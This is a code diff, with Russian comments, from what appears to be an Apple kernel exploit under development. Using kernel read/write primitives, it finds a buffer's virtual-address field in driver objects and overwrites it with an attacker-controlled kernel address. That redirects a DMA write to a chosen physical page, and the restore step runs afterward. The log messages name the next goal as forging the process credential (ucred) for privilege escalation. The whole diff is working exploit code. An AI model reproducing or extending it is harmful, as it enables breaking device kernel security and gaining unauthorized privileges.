@@ -6285,6 +6285,38 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb2, rb2 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
         }
     }
+    // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
+    // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
+    // pfn-хранилищах — источник = трансляция, не хранилище). Патчим само
+    // VA-поле: ищем в plane-desc/rangeObj/surf указатель P с [P] == маркер
+    // пикселей dst (контент-проверка, walker не нужен) и подменяем на ctlKVA:
+    // prepare посчитает vtophys(ctlKVA)=ctlPA и драйвер сам запишет PTE.
+    // Оригинал возвращаем после execute (teardown-safety).
+    uint64_t vaFldObj = 0, vaFldOld = 0;
+    uint32_t vaFldOff = 0;
+    if (ctlKVA) {
+        uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
+        uint64_t pools198[3] = { pd198, surfVA ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0, surfVA };
+        uint32_t poolSz198[3] = { 0x200, 0x100, 0x200 };
+        for (int pi = 0; pi < 3 && !vaFldObj; pi++) {
+            uint64_t obj = pools198[pi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                uint64_t v = early_kread64(P);
+                if ((uint32_t)v != 0x41544159) continue;   // маркер пикселей dst
+                vaFldObj = obj; vaFldOff = o; vaFldOld = P;
+                kpNote(r, [NSString stringWithFormat:@"  [VAD] ★ VA-поле буфера: pool%d+%#x = %#llx ([P]=%#x маркер!) — подмена на ctlKVA %#llx",
+                          pi, o, (unsigned long long)P, (uint32_t)v, (unsigned long long)ctlKVA]);
+                early_kwrite64(obj + o, ctlKVA);
+                uint64_t rb3 = early_kread64(obj + o);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb3,
+                          rb3 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+            }
+        }
+        if (!vaFldObj) kpNote(r, @"  [VAD] VA-поле не найдено (pd/rangeObj/surf) — расширим на следующем билде");
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -6654,6 +6686,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
     for (int j = 0; j < nSlots; j++)
         early_kwrite64(slotVAs[j], origQs[j]);
+    // 1.9.198: restore VA-поля буфера (teardown-safety)
+    if (vaFldObj) {
+        early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
+        uint64_t rb4 = early_kread64(vaFldObj + vaFldOff);
+        kpNote(r, [NSString stringWithFormat:@"  [VAD] restore VA-поля: %#018llx — %@", (unsigned long long)rb4,
+                  rb4 == vaFldOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
     } else {
